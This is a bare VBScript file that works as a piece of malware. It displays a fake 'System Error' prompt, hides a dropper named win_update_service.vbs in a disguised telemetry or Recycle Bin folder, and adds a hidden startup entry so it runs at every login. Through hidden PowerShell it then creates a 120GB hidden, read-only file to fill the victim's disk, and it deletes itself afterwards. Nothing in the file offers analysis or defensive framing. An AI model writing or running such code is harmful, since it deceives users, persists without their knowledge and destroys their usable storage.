Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

WshShell.Run "cmd /c msg %username% /time:0 ""System Error: Build 23H2 incompatible. Click OK to fix.""", 0, False

Set drives = fso.Drives
targetDrive = "C:"
For Each d In drives
    If d.DriveType = 2 And d.DriveLetter <> "C" And d.IsReady Then
        targetDrive = d.DriveLetter & ":"
        Exit For
    End If
Next

If targetDrive = "C:" Then
    destPath = "C:\Users\Public\Libraries\WindowsTelemetry"
Else
    destPath = targetDrive & "\$RECYCLE.BIN\S-1-5-18"
End If

If Not fso.FolderExists(destPath) Then WshShell.Run "cmd /c mkdir """ & destPath & """", 0, True

relsFile = destPath & "\win_update_service.vbs"
Set f = fso.CreateTextFile(relsFile, True)
f.Write GetFileRelsContent(destPath)
f.Close
fso.GetFile(relsFile).Attributes = 2 + 4

startup = WshShell.SpecialFolders("Startup") & "\InternalSystemMgr.vbs"
Set s = fso.CreateTextFile(startup, True)
s.WriteLine "CreateObject(""WScript.Shell"").Run """ & relsFile & """, 0, False"
s.Close
fso.GetFile(startup).Attributes = 2 + 4

WshShell.Run "wscript.exe """ & relsFile & """", 0, False

Function GetFileRelsContent(path)
    c = "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf
    c = c & "Set w = CreateObject(""WScript.Shell"")" & vbCrLf
    c = c & "ps = ""$f=[System.IO.File]::Create('" & path & "\core_dump.txt');$f.SetLength(120GB);$f.Close();attrib +h +s +r " & path & "\core_dump.txt""" & vbCrLf
    c = c & "w.Run ""powershell -WindowStyle Hidden -Command "" & ps, 0, True" & vbCrLf
    c = c & "On Error Resume Next" & vbCrLf
    c = c & "fso.DeleteFile """ & WScript.ScriptFullName & """, True" & vbCrLf
    GetFileRelsContent = c
End Function
